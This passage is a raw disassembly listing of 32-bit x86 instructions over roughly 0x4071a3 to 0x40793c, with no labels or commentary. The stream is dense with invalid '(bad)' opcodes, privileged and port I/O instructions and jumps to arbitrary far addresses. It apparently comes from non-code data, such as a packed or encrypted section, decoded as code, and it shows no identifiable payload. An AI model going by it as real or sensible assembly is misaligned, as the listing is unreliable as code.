  4071a3:	es out 0xeb,al
  4071a6:	in     al,dx
  4071a7:	xor    eax,0x4342e737
  4071ac:	pushf  
  4071ad:	fbld   TBYTE PTR [esi+edi*2+0x773914c]
  4071b4:	xchg   esi,eax
  4071b5:	cmc    
  4071b6:	or     edi,0x107c33d0
  4071bc:	jbe    0x407188
  4071be:	dec    ebx
  4071bf:	enter  0xb721,0x4d
  4071c3:	mov    al,ds:0x53f74b38
  4071c8:	fbld   TBYTE PTR [ecx-0x28d53195]
  4071ce:	xchg   esp,eax
  4071cf:	mov    bl,0x97
  4071d1:	mov    ecx,0x48522e53
  4071d6:	xlat   BYTE PTR ds:[ebx]
  4071d7:	add    eax,DWORD PTR [si-0x5257]
  4071dc:	pop    edx
  4071dd:	pop    eax
  4071de:	les    edi,FWORD PTR [eax-0x5f1f78a2]
  4071e4:	jbe    0x40723d
  4071e6:	and    BYTE PTR [eax-0x357494c4],cl
  4071ec:	xlat   BYTE PTR ds:[ebx]
  4071ed:	cmp    bh,dh
  4071ef:	ret    0x63e0
  4071f2:	pop    ebx
  4071f3:	in     eax,0x59
  4071f5:	pop    es
  4071f6:	cmp    DWORD PTR [ebx+ebx*1-0x2f],esi
  4071fa:	lds    ecx,FWORD PTR [ebx]
  4071fc:	sub    bl,BYTE PTR [edi+0x5b]
  4071ff:	lea    ecx,[eax+edx*2]
  407202:	xrelease mov DWORD PTR [ebp-0x32],esi
  407206:	add    DWORD PTR [ebx],0x44
  407209:	jg     0x407277
  40720b:	sub    ebx,ebx
  40720d:	push   cs
  40720e:	test   al,0x0
  407210:	dec    esp
  407211:	inc    edi
  407212:	adc    BYTE PTR [esi+0x9],ah
  407215:	push   ecx
  407216:	and    eax,0x6b3fd7ac
  40721b:	and    BYTE PTR [ecx],bl
  40721d:	sti    
  40721e:	mov    edx,DWORD PTR [edx+0x5d8340dd]
  407224:	mov    DWORD PTR [edx+0x16c710d9],eax
  40722a:	dec    ebx
  40722b:	sub    esp,DWORD PTR [esi-0x5c]
  40722e:	add    esp,DWORD PTR [ebx-0x5d]
  407231:	hlt    
  407232:	jae    0x4071c9
  407234:	jb     0x407256
  407236:	mov    al,0xbc
  407238:	scas   eax,DWORD PTR es:[edi]
  407239:	mov    al,0xd
  40723b:	or     al,BYTE PTR [edi-0x4f9caeff]
  407241:	xchg   esi,eax
  407242:	lea    esi,[eax-0x74459b8]
  407248:	icebp  
  407249:	and    esp,DWORD PTR [ebp-0x51]
  40724c:	add    ch,ah
  40724e:	push   eax
  40724f:	(bad)  
  407250:	mov    ds:0xab84764e,al
  407255:	push   eax
  407256:	pushf  
  407257:	jle    0x40725e
  407259:	and    dl,BYTE PTR [ecx-0x73]
  40725c:	pop    ds
  40725d:	fwait
  40725e:	xor    eax,0x2493b419
  407263:	sbb    al,0x8c
  407265:	or     BYTE PTR [edx+0x1f],0x10
  407269:	push   eax
  40726a:	jmp    0x4560df8e
  40726f:	fadd   QWORD PTR [eax]
  407271:	mov    ebx,0x64fbd1f1
  407276:	sbb    eax,0xb9e323e1
  40727b:	cwde   
  40727c:	cmp    dh,BYTE PTR [edi-0x4db1e73a]
  407282:	jecxz  0x407250
  407284:	enter  0xa56,0xd0
  407288:	xor    al,0xfb
  40728a:	arpl   WORD PTR [esi],dx
  40728c:	aaa    
  40728d:	sub    DWORD PTR [edi-0x1b],esp
  407290:	inc    esi
  407291:	lahf   
  407292:	test   eax,0x4056277d
  407297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407298:	xor    DWORD PTR [eax+0x7d447e29],ebp
  40729e:	popf   
  40729f:	es xchg edx,eax
  4072a1:	cmp    BYTE PTR [edx],0x27
  4072a4:	adc    BYTE PTR [ebx],bh
  4072a6:	loope  0x407300
  4072a8:	aaa    
  4072a9:	or     dh,bh
  4072ab:	jb     0x4072cd
  4072ad:	dec    ecx
  4072ae:	ficom  DWORD PTR [edi+0x43]
  4072b1:	push   ds
  4072b2:	push   ecx
  4072b3:	sub    DWORD PTR [esi],esp
  4072b5:	mov    esi,0x8ac84e09
  4072ba:	aam    0x71
  4072bc:	and    esp,esi
  4072be:	mov    cs,ebp
  4072c0:	mov    WORD PTR [ebp+0x1e0a6b2b],cs
  4072c6:	jb     0x407252
  4072c8:	sub    al,0xc5
  4072ca:	ins    BYTE PTR es:[edi],dx
  4072cb:	fisttp WORD PTR [ecx-0x45]
  4072ce:	nop
  4072cf:	lea    ebp,[ecx]
  4072d1:	dec    edx
  4072d2:	inc    edi
  4072d3:	adc    eax,0xfeec71e5
  4072d8:	enter  0xadd6,0xc0
  4072dc:	adc    DWORD PTR [ecx-0x5c],0x42
  4072e0:	xchg   esi,eax
  4072e1:	cmp    eax,0x28bacc1
  4072e6:	stos   BYTE PTR es:[edi],al
  4072e7:	out    dx,eax
  4072e8:	jg     0x4072bb
  4072ea:	ror    BYTE PTR [esi-0x23],cl
  4072ed:	arpl   cx,bx
  4072ef:	std    
  4072f0:	push   edi
  4072f1:	push   cs
  4072f2:	clc    
  4072f3:	sub    eax,ecx
  4072f5:	pop    edi
  4072f6:	mov    ds:0xf1849d3e,eax
  4072fb:	repz cwde 
  4072fd:	arpl   WORD PTR [ebp+0x4b],di
  407300:	cs ins DWORD PTR es:[edi],dx
  407302:	fcmovnu st,st(7)
  407304:	jp     0x40736d
  407306:	mov    edx,DWORD PTR [edx+0xf681076]
  40730c:	adc    DWORD PTR [eax+0x55],ecx
  40730f:	jo     0x40735b
  407311:	dec    edi
  407312:	pop    es
  407313:	fnstcw WORD PTR [edi-0x2a9129bf]
  407319:	jl     0x407315
  40731b:	push   edx
  40731c:	mov    ds:0x18ae82f4,al
  407321:	xchg   edx,eax
  407322:	add    DWORD PTR [eax],ebp
  407324:	faddp  st(2),st
  407326:	lea    edi,[ecx+0x5dc791a5]
  40732c:	xchg   esp,eax
  40732d:	jo     0x407329
  40732f:	sar    ch,1
  407331:	and    esp,0x72
  407334:	sbb    al,0x7d
  407336:	iret   
  407337:	push   ds
  407338:	ds jbe 0x40733a
  40733b:	push   cs
  40733c:	or     al,0x59
  40733e:	inc    esi
  40733f:	fisttp DWORD PTR [edi-0x7e04e973]
  407345:	loop   0x40735e
  407347:	ror    BYTE PTR [edi],cl
  407349:	shl    BYTE PTR [ebx],cl
  40734b:	call   0x8bac:0xc36c8467
  407352:	jp     0x407323
  407354:	jg     0x40739e
  407356:	call   0x7d64:0x1eb08ad6
  40735d:	scas   eax,DWORD PTR es:[edi]
  40735e:	lock add edx,DWORD PTR [edi-0x6d3aa8b8]
  407365:	jae    0x407342
  407367:	ins    BYTE PTR es:[edi],dx
  407368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407369:	pop    ss
  40736a:	jg     0x4073ce
  40736c:	inc    ebp
  40736d:	stc    
  40736e:	cwde   
  40736f:	dec    eax
  407370:	int3   
  407371:	xchg   esi,eax
  407372:	push   ebx
  407373:	xor    DWORD PTR [ecx+0x74ebac2a],esi
  407379:	cmp    bl,dh
  40737b:	fucomi st,st(0)
  40737d:	das    
  40737e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40737f:	pop    ebx
  407380:	ja     0x40736e
  407382:	(bad)  
  407383:	xchg   ebp,eax
  407384:	cmp    eax,0x2411c7e7
  407389:	add    al,0x9d
  40738b:	lahf   
  40738c:	cdq    
  40738d:	fbld   TBYTE PTR [esi]
  40738f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407391:	xchg   edi,eax
  407392:	and    esp,esi
  407394:	or     eax,0x130365a4
  407399:	fwait
  40739a:	pop    ecx
  40739b:	stos   DWORD PTR es:[edi],eax
  40739c:	inc    esp
  40739d:	add    ch,BYTE PTR [edx+0x3c]
  4073a0:	xchg   edx,eax
  4073a1:	aas    
  4073a2:	rcr    BYTE PTR [ebp+0x386e0b1f],0x1
  4073a9:	cmp    al,0x31
  4073ab:	imul   ecx,ebp,0x4
  4073ae:	xor    esp,DWORD PTR [edx]
  4073b0:	push   es
  4073b1:	or     BYTE PTR [eax-0x6d],bh
  4073b4:	push   es
  4073b5:	jl     0x407424
  4073b7:	jb     0x4073fc
  4073b9:	imul   esi,DWORD PTR [eax+0x194cee9],0x9b593098
  4073c3:	rcl    dl,1
  4073c5:	pop    es
  4073c6:	and    bh,BYTE PTR [edi+0x6b]
  4073c9:	inc    esp
  4073ca:	adc    ah,BYTE PTR [esi]
  4073cc:	aaa    
  4073cd:	imul   DWORD PTR [edi+eax*1+0x30]
  4073d1:	or     dl,BYTE PTR [edx+ebp*8+0x22]
  4073d5:	jle    0x407358
  4073d7:	xchg   edi,eax
  4073d8:	call   0x8d136143
  4073dd:	push   cs
  4073de:	in     al,dx
  4073df:	pop    ebp
  4073e0:	jmp    0x3a43:0x488cb24f
  4073e7:	test   eax,0x98194219
  4073ec:	pusha  
  4073ed:	cli    
  4073ee:	and    al,0x2d
  4073f0:	(bad)  
  4073f2:	and    ecx,DWORD PTR [eax-0x31e2a5e5]
  4073f8:	or     ebp,DWORD PTR ss:[edi-0x2bb7361d]
  4073ff:	shl    BYTE PTR [ebx+0x4893bb76],cl
  407405:	mov    ebx,0xdbd2d732
  40740a:	aaa    
  40740b:	(bad)  
  40740c:	or     BYTE PTR [ecx-0x60],ch
  40740f:	test   al,0x8c
  407411:	push   cs
  407412:	inc    edx
  407413:	pusha  
  407414:	shr    eax,1
  407416:	(bad)
  40741a:	push   esi
  40741b:	mov    eax,0x5bb8d71
  407420:	jno    0x4073f8
  407422:	xor    bl,dl
  407424:	pushf  
  407425:	mov    ebx,0x67233551
  40742a:	sbb    al,0xbe
  40742c:	push   0xf21a060f
  407431:	and    cl,BYTE PTR [ecx+eiz*8]
  407434:	cmp    al,bl
  407436:	push   esi
  407437:	mov    al,0x26
  407439:	les    edx,FWORD PTR [ecx]
  40743b:	jg     0x40743c
  40743d:	jne    0x40744a
  40743f:	lods   al,BYTE PTR ds:[esi]
  407440:	retf   0xdbca
  407443:	adc    eax,0x2dad147c
  407448:	fwait
  407449:	jle    0x4073d0
  40744b:	iret   
  40744c:	pop    eax
  40744d:	inc    edi
  40744e:	pop    ebx
  40744f:	xor    eax,0xe1ecc5ec
  407454:	pop    ecx
  407455:	mov    esp,0x8efa4c61
  40745a:	and    eax,0xc562a7a7
  40745f:	dec    eax
  407460:	pop    ecx
  407461:	dec    edi
  407462:	pop    edx
  407463:	jmp    0x407428
  407465:	or     ebx,DWORD PTR [edx+0x49]
  407468:	or     al,0xd
  40746a:	push   0xfffffffb
  40746c:	aad    0x8a
  40746e:	jmp    0x8887becf
  407473:	out    dx,al
  407474:	retf   
  407475:	push   ss
  407476:	sti    
  407477:	xlat   BYTE PTR ds:[ebx]
  407478:	mov    bh,bh
  40747a:	dec    ebx
  40747b:	dec    esi
  40747c:	aas    
  40747d:	(bad)  
  40747e:	jne    0x407444
  407480:	cmp    al,0x28
  407482:	jl     0x4074b4
  407484:	pop    es
  407485:	or     al,0x55
  407487:	xchg   edi,eax
  407488:	call   0xffd076fa
  40748d:	sub    ebp,DWORD PTR [eax]
  40748f:	xchg   edi,eax
  407490:	sti    
  407491:	and    eax,esp
  407493:	ja     0x4074cc
  407495:	in     al,dx
  407496:	aad    0xb3
  407498:	fdiv   st,st(5)
  40749a:	bound  ebx,QWORD PTR [ebp+0x25]
  40749d:	sub    DWORD PTR [esi+0x6ec613b8],0xbc7d851f
  4074a7:	cmc    
  4074a8:	inc    eax
  4074a9:	push   es
  4074aa:	shr    eax,cl
  4074ac:	sbb    ebx,DWORD PTR [eax-0x6d]
  4074af:	in     al,dx
  4074b0:	jmp    0xf0afdfd8
  4074b5:	leave  
  4074b6:	test   DWORD PTR [esi-0x28ec8ddf],edx
  4074bc:	sub    edi,eax
  4074be:	jmp    DWORD PTR [edx+0x47d0d8e2]
  4074c4:	cld    
  4074c5:	push   ebx
  4074c6:	sbb    DWORD PTR [esi+0x17],edi
  4074c9:	clc    
  4074ca:	push   esp
  4074cb:	cmp    ebx,ebp
  4074cd:	adc    dh,cl
  4074cf:	and    eax,0xf658a4a7
  4074d4:	fisub  WORD PTR [edi]
  4074d6:	scas   al,BYTE PTR es:[edi]
  4074d7:	jo     0xff350efd
  4074dd:	bound  edi,QWORD PTR [esi+eax*8]
  4074e0:	jae    0x40751e
  4074e2:	push   ebp
  4074e3:	sub    dh,0xf4
  4074e6:	test   BYTE PTR [ebx+eax*8-0x2de8904b],bl
  4074ed:	pop    ss
  4074ee:	sub    al,BYTE PTR cs:[ebx]
  4074f1:	mov    BYTE PTR [edi-0x67c66d26],cl
  4074f7:	ins    DWORD PTR es:[edi],dx
  4074f8:	ret    0x3311
  4074fb:	outs   dx,BYTE PTR ds:[esi]
  4074fc:	test   dl,bh
  4074fe:	loope  0x4074bf
  407500:	xor    esp,DWORD PTR [esi]
  407502:	mov    bl,0xbd
  407504:	dec    ecx
  407505:	mov    esi,0x28a03812
  40750a:	daa    
  40750b:	xchg   esi,eax
  40750c:	cmp    BYTE PTR [ecx],bl
  40750e:	sub    eax,0x80bfcbdb
  407513:	sbb    al,0x17
  407515:	aad    0xd4
  407517:	sbb    al,BYTE PTR [edi-0x6ecb88e7]
  40751d:	mov    dh,0xc4
  40751f:	ficom  WORD PTR [ecx+ebp*1-0x5]
  407523:	xor    dh,BYTE PTR [esi+0x55aa0988]
  407529:	add    DWORD PTR [ecx+0x3de2f67b],edi
  40752f:	dec    ecx
  407530:	pop    eax
  407531:	cmp    DWORD PTR [esp+esi*2+0x5c],edx
  407535:	add    DWORD PTR es:[ebp-0x50024b7],0x33
  40753d:	or     al,0x57
  40753f:	in     al,dx
  407540:	pop    ebx
  407541:	dec    ebx
  407542:	push   edx
  407543:	jo     0x40756a
  407545:	repnz fdivr DWORD PTR [ebx+0x12]
  407549:	mov    al,ss:0x5360d970
  40754f:	mov    dl,0xc9
  407551:	mov    cl,0x3f
  407553:	shl    BYTE PTR [edi+0x16e2a834],cl
  407559:	mov    DWORD PTR [esi],esp
  40755b:	sbb    DWORD PTR [ecx],esp
  40755d:	adc    DWORD PTR [ebx-0x7f],0x1ebe2f29
  407564:	push   DWORD PTR [edx]
  407566:	ja     0x407563
  407568:	rol    edx,cl
  40756a:	adc    al,0xae
  40756c:	jb     0x407538
  40756e:	dec    ebx
  40756f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407570:	lds    esp,FWORD PTR [edx+edi*4]
  407573:	add    eax,0x42a63a9d
  407578:	fstp   TBYTE PTR [edi+0x1b668286]
  40757e:	imul   ebx,DWORD PTR ds:0xd838170b,0xffffffcd
  407585:	xor    edi,DWORD PTR [ebp-0x79972a57]
  40758b:	in     al,dx
  40758c:	jp     0x4075be
  40758e:	dec    ecx
  40758f:	cmp    DWORD PTR [edi+0x60],esp
  407592:	loop   0x40760b
  407594:	mov    bh,0x2f
  407596:	or     al,BYTE PTR [eax+0x32f29ca2]
  40759c:	pop    ecx
  40759d:	and    edx,edx
  40759f:	inc    ecx
  4075a0:	mov    BYTE PTR [ecx-0x6e752efe],ch
  4075a6:	xchg   DWORD PTR [ebp+0x61],edx
  4075a9:	sbb    al,0x47
  4075ab:	dec    eax
  4075ac:	cdq    
  4075ad:	dec    ecx
  4075ae:	gs popf 
  4075b0:	inc    esi
  4075b1:	cli    
  4075b2:	lods   eax,DWORD PTR ds:[esi]
  4075b3:	cmp    DWORD PTR [edx-0x572d09fa],eax
  4075b9:	js     0x40761f
  4075bb:	mov    al,0xe7
  4075bd:	enter  0x561f,0xe9
  4075c1:	fisttp WORD PTR [ebx-0x3a]
  4075c4:	jns    0x407602
  4075c6:	cmp    edi,DWORD PTR [edi-0x49e811bc]
  4075cc:	retf   0x3177
  4075cf:	cli    
  4075d0:	stc    
  4075d1:	fst    DWORD PTR [ebp+0x6c3e60ee]
  4075d7:	mov    WORD PTR [ebx+ebx*2],?
  4075da:	inc    eax
  4075db:	mov    cs,ebp
  4075dd:	pop    ebp
  4075de:	aas    
  4075df:	iret   
  4075e0:	test   DWORD PTR [edi],0x413d2ee8
  4075e6:	inc    ecx
  4075e7:	addr16 pop edx
  4075e9:	mov    BYTE PTR [ecx],0xe
  4075ec:	mov    eax,ds:0xa0187d09
  4075f1:	mov    esi,ecx
  4075f3:	dec    edi
  4075f4:	dec    eax
  4075f5:	dec    edi
  4075f6:	pop    ecx
  4075f7:	test   al,0x14
  4075f9:	(bad)  ds:0x4c1136fd
  4075ff:	adc    esi,0x16
  407602:	(bad)  
  407603:	mov    bl,BYTE PTR [esi]
  407605:	fnstcw WORD PTR [ebp-0x4e]
  407608:	data16 out dx,al
  40760a:	sbb    al,0x69
  40760c:	pusha  
  40760d:	jecxz  0x407593
  40760f:	sbb    dh,al
  407611:	mov    ebx,DWORD PTR [ecx+ebx*1-0x622246c3]
  407618:	pop    ecx
  407619:	out    dx,eax
  40761a:	(bad)  
  40761b:	in     eax,0x7
  40761d:	sbb    al,0xaa
  40761f:	repz sbb DWORD PTR [esi],esi
  407622:	jl     0x407621
  407624:	imul   edi,DWORD PTR [ecx-0x7ba768ea],0x15
  40762b:	mov    al,ds:0xa998109f
  407630:	ret    0xdcfa
  407633:	out    0xa5,eax
  407635:	xchg   ebp,eax
  407636:	int3   
  407637:	push   edx
  407638:	lods   eax,DWORD PTR ds:[esi]
  407639:	or     DWORD PTR [eax],eax
  40763b:	not    BYTE PTR [esi+0x646dd206]
  407641:	ret    0x755e
  407644:	and    al,0x10
  407646:	add    DWORD PTR [edi-0x52],edi
  407649:	pop    edi
  40764a:	add    BYTE PTR [esi+0x402bb0d],bh
  407650:	xchg   esi,eax
  407651:	xlat   BYTE PTR ds:[ebx]
  407652:	ins    BYTE PTR es:[edi],dx
  407653:	xchg   ebx,eax
  407654:	add    BYTE PTR [ebx+eiz*1],bh
  407657:	and    DWORD PTR [edi+0x204fe5c7],esi
  40765d:	repnz sub DWORD PTR [ebp+esi*8+0x1af5089d],esi
  407665:	inc    edx
  407666:	inc    esi
  407667:	jmp    0x371e:0x2cb0d7ff
  40766e:	in     eax,0x4f
  407670:	bswap  ebx
  407672:	push   ds
  407673:	(bad)  
  407674:	push   eax
  407675:	sub    ebx,DWORD PTR [esi+ebx*4]
  407678:	push   0x39
  40767a:	scas   al,BYTE PTR es:[edi]
  40767b:	xchg   edi,eax
  40767c:	sub    BYTE PTR [eax],0xe
  40767f:	jb     0x40765e
  407681:	jno    0x407622
  407683:	popf   
  407684:	push   edi
  407685:	clc    
  407686:	push   es
  407687:	push   es
  407688:	inc    ebp
  407689:	ds jns 0x4076ae
  40768c:	hlt    
  40768d:	sub    al,0xac
  40768f:	stc    
  407690:	or     al,0x59
  407692:	jl     0x4076f7
  407694:	xchg   esp,eax
  407695:	xchg   ecx,eax
  407696:	mov    ecx,ebp
  407698:	imul   DWORD PTR [esi]
  40769a:	xchg   edx,ecx
  40769c:	pop    ecx
  40769d:	gs arpl dx,dx
  4076a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076a1:	out    dx,al
  4076a2:	or     DWORD PTR [edi+0x3621ac5c],eax
  4076a8:	jo     0x4076b7
  4076aa:	mov    edx,0x48c198d6
  4076af:	mov    esp,0x609d4477
  4076b4:	stc    
  4076b5:	sbb    ch,dl
  4076b7:	pop    ds
  4076b8:	loope  0x407684
  4076ba:	cmp    BYTE PTR [ebp-0xd],ah
  4076bd:	mov    ebx,0x9542340a
  4076c2:	add    ecx,DWORD PTR [ecx+ebx*4-0x2]
  4076c6:	mov    dl,0x2d
  4076c8:	mov    ds:0x5296d606,eax
  4076cd:	jecxz  0x407666
  4076cf:	dec    ecx
  4076d0:	dec    ebx
  4076d1:	mov    dh,0x23
  4076d3:	scas   eax,DWORD PTR es:[edi]
  4076d4:	cmp    cl,BYTE PTR [edi+0xa]
  4076d7:	adc    ecx,DWORD PTR [ecx]
  4076d9:	push   0xa049a00d
  4076de:	dec    eax
  4076df:	adc    cl,BYTE PTR [ebx+ebp*2-0x5d]
  4076e3:	test   BYTE PTR [ebx+0x15],ch
  4076e6:	xchg   ecx,eax
  4076e7:	(bad)  [edx]
  4076e9:	cmc    
  4076ea:	stc    
  4076eb:	ins    DWORD PTR es:[edi],dx
  4076ec:	stos   DWORD PTR es:[edi],eax
  4076ed:	dec    eax
  4076ee:	cld    
  4076ef:	js     0x407743
  4076f1:	xchg   esi,eax
  4076f2:	imul   ah
  4076f4:	loope  0x40771f
  4076f6:	test   DWORD PTR [ecx-0x5b81a74],ecx
  4076fc:	lock scas al,BYTE PTR es:[edi]
  4076fe:	mov    eax,0xddf0d9a6
  407703:	mov    dl,0xde
  407705:	mov    esp,0xf9031d09
  40770a:	push   0xffffffb8
  40770c:	fsubr  QWORD PTR [edx+0x3b8c48ff]
  407712:	xor    al,0x27
  407714:	test   dh,al
  407716:	cld    
  407717:	jmp    0x407748
  407719:	jle    0x407752
  40771b:	popf   
  40771c:	retf   
  40771d:	pop    esi
  40771e:	gs loope 0x4076f5
  407721:	push   ebx
  407722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407723:	enter  0xf51b,0x2
  407727:	fsubr  DWORD PTR [ebp-0x8d7c15a]
  40772d:	ret    
  40772e:	scas   eax,DWORD PTR es:[edi]
  40772f:	repnz fnstenv [edi]
  407732:	mov    eax,0xbbb7d94e
  407737:	and    edx,0x127d1f5d
  40773d:	aaa    
  40773e:	lea    eax,es:[ebp+0x40]
  407742:	push   ds
  407743:	cmp    dh,dl
  407745:	inc    ebx
  407746:	cmp    edx,DWORD PTR [eax]
  407748:	cmp    eax,0x15193832
  40774d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40774e:	and    BYTE PTR [edx],bl
  407750:	push   edi
  407751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407752:	call   0xea4c:0x2350a7c5
  407759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40775a:	xlat   BYTE PTR ds:[ebx]
  40775b:	in     eax,0xa7
  40775d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40775e:	jno    0x40771f
  407760:	dec    ecx
  407761:	ins    DWORD PTR es:[edi],dx
  407762:	jno    0x40772a
  407764:	inc    ebx
  407765:	cmp    eax,0xba82bbd3
  40776a:	repnz jecxz 0x407753
  40776d:	ror    ah,1
  40776f:	or     al,0x5f
  407771:	pop    ebx
  407772:	inc    edi
  407773:	mov    bh,0x7b
  407775:	jo     0x407770
  407777:	sti    
  407778:	repz das 
  40777a:	and    al,0x3b
  40777c:	mov    edx,0xd9f7b017
  407781:	dec    edx
  407782:	neg    BYTE PTR [ecx]
  407784:	(bad)  
  407785:	sbb    eax,0x25c63b1a
  40778a:	jo     0x4077bb
  40778c:	gs pop ds
  40778e:	dec    edx
  40778f:	inc    edx
  407790:	dec    edx
  407791:	retf   
  407792:	add    BYTE PTR [edx+0x72405946],0xd5
  407799:	push   esp
  40779a:	stos   BYTE PTR es:[edi],al
  40779b:	imul   ebx,ebp,0x4cce397f
  4077a1:	cdq    
  4077a2:	sbb    BYTE PTR [eax+0x538549e],dl
  4077a8:	iret   
  4077a9:	add    esp,eax
  4077ab:	xchg   edi,eax
  4077ac:	arpl   WORD PTR [esi+0x50],dx
  4077af:	sub    ch,bl
  4077b1:	sar    edx,1
  4077b3:	ss push ebp
  4077b5:	pusha  
  4077b6:	lds    esp,FWORD PTR [ecx-0x7b]
  4077b9:	shl    bh,cl
  4077bb:	cmc    
  4077bc:	iret   
  4077bd:	add    eax,0xe0227c9e
  4077c2:	xor    BYTE PTR [ecx-0x471a75ae],0xa8
  4077c9:	in     eax,0x41
  4077cb:	pop    edx
  4077cc:	retf   0xd59c
  4077cf:	outs   dx,BYTE PTR ds:[esi]
  4077d0:	sub    eax,0x9c440025
  4077d5:	inc    esi
  4077d6:	lods   eax,DWORD PTR ds:[esi]
  4077d7:	bound  edx,QWORD PTR [eax]
  4077d9:	(bad)  
  4077da:	fsubr  QWORD PTR [esi]
  4077dc:	dec    ecx
  4077dd:	sbb    eax,DWORD PTR [ebx+0x38f0859e]
  4077e3:	xor    DWORD PTR [edi+edx*8],esi
  4077e6:	imul   eax,DWORD PTR [esi-0x6c],0xde49cf0d
  4077ed:	dec    esi
  4077ee:	jg     0x4077a1
  4077f0:	dec    ebp
  4077f1:	or     eax,0xc3b10299
  4077f6:	add    edx,DWORD PTR [esi+0x7e419a3d]
  4077fc:	sar    DWORD PTR ds:[ebp+0x2784914c],1
  407803:	repz push edx
  407805:	push   eax
  407806:	and    esp,DWORD PTR [ecx+0x5bb72d57]
  40780c:	cmp    eax,DWORD PTR [edx]
  40780e:	pop    ebx
  40780f:	fcomp  st(2)
  407811:	icebp  
  407812:	inc    esp
  407813:	inc    edi
  407814:	scas   al,BYTE PTR es:[edi]
  407815:	in     al,0xb2
  407817:	clc    
  407818:	xchg   esi,eax
  407819:	lds    ebp,FWORD PTR [eax+0xd]
  40781c:	fcom   DWORD PTR [edi-0x7f]
  40781f:	gs retf 
  407821:	(bad)  
  407822:	and    DWORD PTR [edx],ecx
  407824:	dec    esi
  407825:	pop    edx
  407826:	idiv   ah
  407828:	or     ah,BYTE PTR [eax+eiz*1+0x9]
  40782c:	out    dx,eax
  40782d:	lods   eax,DWORD PTR ds:[esi]
  40782e:	ds pop esi
  407830:	sub    esi,DWORD PTR [edx]
  407832:	sub    edi,DWORD PTR [esp+0x49]
  407836:	mov    bl,0x5e
  407838:	and    eax,0xec257993
  40783d:	adc    eax,0xedbd4cc2
  407842:	loop   0x40786c
  407844:	xchg   ebp,eax
  407845:	push   0x77
  407847:	pusha  
  407848:	dec    eax
  407849:	shl    edx,0xf0
  40784c:	cwde   
  40784d:	jecxz  0x40785d
  40784f:	xchg   esp,eax
  407850:	aaa    
  407851:	and    ecx,DWORD PTR [edi]
  407853:	cwde   
  407854:	outs   dx,DWORD PTR ds:[esi]
  407855:	sub    edi,eax
  407857:	push   ss
  407858:	or     al,0x1b
  40785a:	sbb    BYTE PTR [eax+0x4e],dl
  40785d:	jg     0x407892
  40785f:	mov    ebp,0x3bb27cc2
  407864:	pop    eax
  407865:	dec    esp
  407866:	pop    es
  407867:	mov    dh,0xd8
  407869:	pusha  
  40786a:	push   edi
  40786b:	cld    
  40786c:	(bad)  
  40786d:	icebp  
  40786e:	jno    0x4078d3
  407870:	inc    esi
  407871:	ins    DWORD PTR es:[edi],dx
  407872:	and    DWORD PTR [edi-0x570fa26c],ebp
  407878:	sbb    DWORD PTR [esi-0x15],esi
  40787b:	cmp    al,BYTE PTR ss:[ecx]
  40787e:	jmp    0x40788b
  407880:	sub    BYTE PTR [ecx-0x5e],bh
  407883:	sub    eax,DWORD PTR [edx]
  407885:	push   0x8e50fd78
  40788a:	inc    esi
  40788b:	xchg   ecx,eax
  40788c:	sub    ebp,esp
  40788e:	push   edi
  40788f:	xchg   eax,ebx
  407891:	push   es
  407892:	dec    eax
  407893:	fisubr WORD PTR [edi+0x19]
  407896:	mov    BYTE PTR [ecx],ah
  407898:	repz cwde 
  40789a:	xlat   BYTE PTR ds:[ebx]
  40789b:	or     eax,0x6941ae6f
  4078a0:	je     0x4078b7
  4078a2:	pop    ds
  4078a3:	daa    
  4078a4:	sbb    al,0x8c
  4078a6:	inc    ebp
  4078a7:	cli    
  4078a8:	sti    
  4078a9:	xlat   BYTE PTR ds:[ebx]
  4078aa:	enter  0x8bd,0x2d
  4078ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078af:	ss cdq 
  4078b1:	mov    edx,0xde1ec83b
  4078b6:	aad    0xbd
  4078b8:	xor    dl,BYTE PTR [esi]
  4078ba:	rcr    BYTE PTR ds:0xbf29f502,0x1f
  4078c1:	jae    0x407892
  4078c3:	sub    al,0xf3
  4078c5:	ficomp DWORD PTR [ebx+0x3b]
  4078c8:	lock inc ecx
  4078ca:	cmc    
  4078cb:	loope  0x4078d7
  4078cd:	ror    edi,1
  4078cf:	test   DWORD PTR [ebp+0x62],0xc4d6f374
  4078d6:	leave  
  4078d7:	into   
  4078d8:	mov    al,0xb7
  4078da:	add    BYTE PTR [ecx-0x78a1cc2d],0x32
  4078e1:	jae    0x407895
  4078e3:	push   ds
  4078e4:	mov    dh,BYTE PTR [edi+0x5]
  4078e7:	cld    
  4078e8:	sbb    eax,DWORD PTR [edi]
  4078ea:	push   ecx
  4078eb:	test   al,0x7d
  4078ed:	xor    dl,BYTE PTR [edi]
  4078ef:	lahf   
  4078f0:	mov    eax,ds:0x5eab8c29
  4078f5:	in     eax,0xf3
  4078f7:	(bad)  
  4078f8:	ds push cs
  4078fa:	lods   al,BYTE PTR ds:[esi]
  4078fb:	inc    eax
  4078fc:	xor    eax,0xd9ed90da
  407901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407902:	mov    ebx,0xca835309
  407907:	sub    al,0x34
  407909:	imul   ecx,DWORD PTR [edi],0xffffffd1
  40790c:	jg     0x407925
  40790e:	and    ebp,esi
  407910:	mov    esi,?
  407912:	and    al,0x33
  407914:	mov    edx,0xad500cf7
  407919:	dec    ecx
  40791a:	adc    ebx,DWORD PTR [esp+ecx*4]
  40791d:	mov    cl,0x25
  40791f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407920:	jge    0x40794c
  407922:	add    edx,ebx
  407924:	mov    cl,0x2a
  407926:	pop    ss
  407927:	mov    dl,0xd5
  407929:	mov    eax,ds:0x173bbcb6
  40792e:	dec    eax
  40792f:	pop    eax
  407930:	lds    edi,FWORD PTR [ecx+0x1f]
  407933:	dec    esi
  407934:	pop    ebp
  407935:	fs push eax
  407937:	mov    cl,0x47
  407939:	push   esp
  40793a:	jns    0x40796e
  40793c:	aas    
